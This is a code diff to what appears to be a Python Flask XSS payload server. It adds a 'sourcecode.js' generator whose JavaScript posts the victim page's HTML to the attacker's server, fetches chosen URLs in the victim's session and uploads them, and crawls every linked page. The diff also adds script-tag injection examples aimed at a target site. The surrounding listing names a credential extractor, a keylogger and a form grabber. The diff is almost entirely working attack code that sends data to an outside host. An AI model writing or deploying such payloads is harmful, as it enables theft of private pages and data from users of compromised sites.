@@ -279,6 +279,312 @@ def get_combo_payload():
   }}, true);
 }})();"""
 
+def get_sourcecode_payload():
+    """Source code exfiltration payload - conditionally exfiltrates page HTML based on query parameter"""
+    # Check if the 'd' or 'u' parameter is set
+    d_param = request.args.get('d', '')
+    u_param = request.args.get('u', '')
+
+    if d_param:
+        # Exfiltrate to /data endpoint as JSON
+        if d_param == 'self':
+            # Exfiltrate current page
+            return f"""(function() {{
+  function exfiltrateSourceCode() {{
+    fetch('http://{server_ip}:{server_port}/data', {{
+      method: 'POST',
+      headers: {{ 'Content-Type': 'application/json' }},
+      body: JSON.stringify({{
+        type: 'source_code',
+        url: document.location.href,
+        html: document.documentElement.outerHTML
+      }})
+    }});
+  }}
+
+  // Wait 2 seconds before exfiltrating to allow page to fully render
+  setTimeout(exfiltrateSourceCode, 2000);
+}})();"""
+        else:
+            # Fetch external URL and exfiltrate
+            return f"""(function() {{
+  function exfiltrateSourceCode() {{
+    var targetUrl = '{d_param}';
+
+    // Fetch the target URL
+    fetch(targetUrl)
+      .then(response => response.text())
+      .then(html => {{
+        // Send fetched HTML to data endpoint
+        fetch('http://{server_ip}:{server_port}/data', {{
+          method: 'POST',
+          headers: {{ 'Content-Type': 'application/json' }},
+          body: JSON.stringify({{
+            type: 'source_code',
+            url: targetUrl,
+            html: html
+          }})
+        }});
+      }})
+      .catch(err => {{
+        // Send error info
+        fetch('http://{server_ip}:{server_port}/data', {{
+          method: 'POST',
+          headers: {{ 'Content-Type': 'application/json' }},
+          body: JSON.stringify({{
+            type: 'source_code_error',
+            url: targetUrl,
+            error: err.toString()
+          }})
+        }});
+      }});
+  }}
+
+  // Wait 2 seconds before exfiltrating to allow page to fully render
+  setTimeout(exfiltrateSourceCode, 2000);
+}})();"""
+    elif u_param:
+        # Exfiltrate to /upload endpoint as raw HTML
+        # Check for custom filename in 'n' parameter
+        n_param = request.args.get('n', '')
+
+        if u_param == 'self':
+            # Exfiltrate current page
+            if n_param:
+                # Use custom filename from n parameter
+                return f"""(function() {{
+  function exfiltrateSourceCode() {{
+    var filename = '{n_param}';
+
+    // Send HTML to upload endpoint
+    fetch('http://{server_ip}:{server_port}/upload/' + filename, {{
+      method: 'POST',
+      body: document.documentElement.outerHTML
+    }});
+  }}
+
+  // Wait 2 seconds before exfiltrating to allow page to fully render
+  setTimeout(exfiltrateSourceCode, 2000);
+}})();"""
+            else:
+                # Generate filename from URL pathname
+                return f"""(function() {{
+  function exfiltrateSourceCode() {{
+    // Extract path from URL (exclude protocol and server)
+    var url = new URL(document.location.href);
+    var filename = url.pathname;
+
+    // Remove leading slash and sanitize filename
+    if (filename.startsWith('/')) {{
+      filename = filename.substring(1);
+    }}
+
+    // If empty (root path), use index.html
+    if (filename === '' || filename === '/') {{
+      filename = 'index.html';
+    }}
+
+    // Replace slashes with underscores for nested paths
+    filename = filename.replace(/\\//g, '_');
+
+    // Send HTML to upload endpoint
+    fetch('http://{server_ip}:{server_port}/upload/' + filename, {{
+      method: 'POST',
+      body: document.documentElement.outerHTML
+    }});
+  }}
+
+  // Wait 2 seconds before exfiltrating to allow page to fully render
+  setTimeout(exfiltrateSourceCode, 2000);
+}})();"""
+        elif u_param == 'all':
+            # Exfiltrate current page AND all linked pages
+            return f"""(function() {{
+  var usedFilenames = {{}};
+
+  // Generate unique filename from URL
+  function generateFilename(url) {{
+    var urlObj = new URL(url);
+    var pathname = urlObj.pathname;
+
+    // Try to extract filename from pathname
+    var parts = pathname.split('/');
+    var lastPart = parts[parts.length - 1];
+
+    var baseFilename;
+    if (lastPart && lastPart.length > 0 && lastPart !== '/') {{
+      // Use the last part of the path as filename
+      baseFilename = lastPart;
+    }} else {{
+      // No filename in path, generate from pathname
+      pathname = pathname.replace(/^\\//, '').replace(/\\/$/, '');
+      if (pathname === '') {{
+        baseFilename = 'index.html';
+      }} else {{
+        baseFilename = pathname.replace(/\\//g, '_') + '.html';
+      }}
+    }}
+
+    // Ensure unique filename
+    var filename = baseFilename;
+    var counter = 1;
+    while (usedFilenames[filename]) {{
+      var dotIndex = baseFilename.lastIndexOf('.');
+      if (dotIndex > 0) {{
+        var name = baseFilename.substring(0, dotIndex);
+        var ext = baseFilename.substring(dotIndex);
+        filename = name + '_' + counter + ext;
+      }} else {{
+        filename = baseFilename + '_' + counter;
+      }}
+      counter++;
+    }}
+
+    usedFilenames[filename] = true;
+    return filename;
+  }}
+
+  // Upload HTML content
+  function uploadContent(url, html) {{
+    var filename = generateFilename(url);
+    fetch('http://{server_ip}:{server_port}/upload/' + filename, {{
+      method: 'POST',
+      body: html
+    }});
+  }}
+
+  function exfiltrateAll() {{
+    // 1. Exfiltrate current page
+    uploadContent(document.location.href, document.documentElement.outerHTML);
+
+    // 2. Find all hyperlinks
+    var links = document.querySelectorAll('a[href]');
+    var urls = [];
+
+    links.forEach(function(link) {{
+      try {{
+        var href = link.href;
+        // Only process valid HTTP(S) URLs
+        if (href && (href.startsWith('http://') || href.startsWith('https://'))) {{
+          // Avoid duplicates
+          if (urls.indexOf(href) === -1) {{
+            urls.push(href);
+          }}
+        }}
+      }} catch(e) {{
+        // Ignore invalid URLs
+      }}
+    }});
+
+    // 3. Fetch and exfiltrate each linked page
+    urls.forEach(function(url, index) {{
+      // Stagger requests to avoid overwhelming the browser
+      setTimeout(function() {{
+        fetch(url)
+          .then(response => response.text())
+          .then(html => {{
+            uploadContent(url, html);
+          }})
+          .catch(err => {{
+            // Silently ignore fetch errors (CORS, network, etc.)
+          }});
+      }}, index * 100); // 100ms delay between each fetch
+    }});
+  }}
+
+  // Wait 2 seconds before starting exfiltration
+  setTimeout(exfiltrateAll, 2000);
+}})();"""
+        else:
+            # Fetch external URL and exfiltrate
+            if n_param:
+                # Use custom filename
+                return f"""(function() {{
+  function exfiltrateSourceCode() {{
+    var targetUrl = '{u_param}';
+    var filename = '{n_param}';
+
+    // Fetch the target URL
+    fetch(targetUrl)
+      .then(response => response.text())
+      .then(html => {{
+        // Send fetched HTML to upload endpoint
+        fetch('http://{server_ip}:{server_port}/upload/' + filename, {{
+          method: 'POST',
+          body: html
+        }});
+      }})
+      .catch(err => {{
+        // Send error info to data endpoint
+        fetch('http://{server_ip}:{server_port}/data', {{
+          method: 'POST',
+          headers: {{ 'Content-Type': 'application/json' }},
+          body: JSON.stringify({{
+            type: 'fetch_error',
+            url: targetUrl,
+            error: err.toString()
+          }})
+        }});
+      }});
+  }}
+
+  // Wait 2 seconds before exfiltrating to allow page to fully render
+  setTimeout(exfiltrateSourceCode, 2000);
+}})();"""
+            else:
+                # Generate filename from target URL pathname
+                return f"""(function() {{
+  function exfiltrateSourceCode() {{
+    var targetUrl = '{u_param}';
+
+    // Fetch the target URL
+    fetch(targetUrl)
+      .then(response => response.text())
+      .then(html => {{
+        // Extract path from target URL (exclude protocol and server)
+        var url = new URL(targetUrl);
+        var filename = url.pathname;
+
+        // Remove leading slash and sanitize filename
+        if (filename.startsWith('/')) {{
+          filename = filename.substring(1);
+        }}
+
+        // If empty (root path), use index.html
+        if (filename === '' || filename === '/') {{
+          filename = 'index.html';
+        }}
+
+        // Replace slashes with underscores for nested paths
+        filename = filename.replace(/\\//g, '_');
+
+        // Send fetched HTML to upload endpoint
+        fetch('http://{server_ip}:{server_port}/upload/' + filename, {{
+          method: 'POST',
+          body: html
+        }});
+      }})
+      .catch(err => {{
+        // Send error info to data endpoint
+        fetch('http://{server_ip}:{server_port}/data', {{
+          method: 'POST',
+          headers: {{ 'Content-Type': 'application/json' }},
+          body: JSON.stringify({{
+            type: 'fetch_error',
+            url: targetUrl,
+            error: err.toString()
+          }})
+        }});
+      }});
+  }}
+
+  // Wait 2 seconds before exfiltrating to allow page to fully render
+  setTimeout(exfiltrateSourceCode, 2000);
+}})();"""
+    else:
+        # No action if neither parameter is set
+        return "// Source code exfiltration hook - add ?d=self|url (to /data) or ?u=self|all|url (to /upload, optional &n=filename)"
+
 @app.route('/ping')
 def ping():
     # Finalize any active /key sequence
@@ -423,6 +729,10 @@ def hooks(subpath=None):
             'function': get_savedcreds_payload,
             'description': 'Saved credentials extractor - captures browser-saved passwords'
         },
+        'sourcecode.js': {
+            'function': get_sourcecode_payload,
+            'description': 'Source code exfiltration - captures page, fetches URL, or crawls links (?d=self|url, ?u=self|all|url&n=filename)'
+        },
         'combo.js': {
             'function': get_combo_payload,
             'description': 'Combined payload - info + keylogger + formgrabber'
@@ -436,7 +746,24 @@ def hooks(subpath=None):
         for filename, payload_info in payloads.items():
             response += f"/hooks/{filename}\n"
             response += f"  {payload_info['description']}\n"
-            response += f"  <script src=\"http://{server_ip}:{server_port}/hooks/{filename}\"></script>\n\n"
+
+            # Add detailed examples for sourcecode.js
+            if filename == 'sourcecode.js':
+                response += f"\n  Usage Examples:\n"
+                response += f"    1. Exfiltrate current page to /data endpoint:\n"
+                response += f"       <script src=\"http://{server_ip}:{server_port}/hooks/sourcecode.js?d=self\"></script>\n\n"
+                response += f"    2. Fetch external URL and send to /data endpoint:\n"
+                response += f"       <script src=\"http://{server_ip}:{server_port}/hooks/sourcecode.js?d=https://target.com/api/config\"></script>\n\n"
+                response += f"    3. Exfiltrate current page to /upload (auto filename):\n"
+                response += f"       <script src=\"http://{server_ip}:{server_port}/hooks/sourcecode.js?u=self\"></script>\n\n"
+                response += f"    4. Exfiltrate current page to /upload (custom filename):\n"
+                response += f"       <script src=\"http://{server_ip}:{server_port}/hooks/sourcecode.js?u=self&n=mypage.html\"></script>\n\n"
+                response += f"    5. Fetch external URL and upload with custom filename:\n"
+                response += f"       <script src=\"http://{server_ip}:{server_port}/hooks/sourcecode.js?u=https://target.com/data&n=data.json\"></script>\n\n"
+                response += f"    6. Crawl and exfiltrate current page + ALL linked pages:\n"
+                response += f"       <script src=\"http://{server_ip}:{server_port}/hooks/sourcecode.js?u=all\"></script>\n\n"
+            else:
+                response += f"  <script src=\"http://{server_ip}:{server_port}/hooks/{filename}\"></script>\n\n"
         return response, 200, {'Content-Type': 'text/plain'}
 
     # Check if requesting a known payload
@@ -446,6 +773,34 @@ def hooks(subpath=None):
 
     # Unknown subpath
     return "Hook not found", 404
+
+@app.route('/api/<path:command>')
+def api(command):
+    # Finalize any active /key sequence
+    finalize_key_sequence()
+
+    requester_ip = request.remote_addr
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    if command == 'clear':
+        # Clear the console window
+        import platform
+        system = platform.system()
+
+        if system == 'Windows':
+            os.system('cls')
+        else:
+            # Linux/Mac/Unix
+            os.system('clear')
+
+        print(f"[{timestamp}] {requester_ip} - API: Console cleared")
+        print("-" * 60)
+        return "Console cleared", 200
+
+    # Unknown API command
+    print(f"[{timestamp}] {requester_ip} - API: Unknown command '{command}'")
+    print("-" * 60)
+    return f"Unknown API command: {command}", 404
 
 @app.route('/upload/<path:filename>', methods=['POST'])
 def upload(filename):
@@ -552,6 +907,7 @@ if __name__ == '__main__':
     print(f"  /hooks                  - Lists available JavaScript payloads")
     print(f"  /hooks/<payload.js>     - Serves specific JavaScript payload")
     print(f"  /upload/<filename>      - File upload endpoint (POST)")
+    print(f"  /api/<command>          - Server control API (e.g., /api/clear to clear console)")
     print(f"  /<path>                 - Serves files from current directory")
     print()
     print("Press CTRL+C to stop")
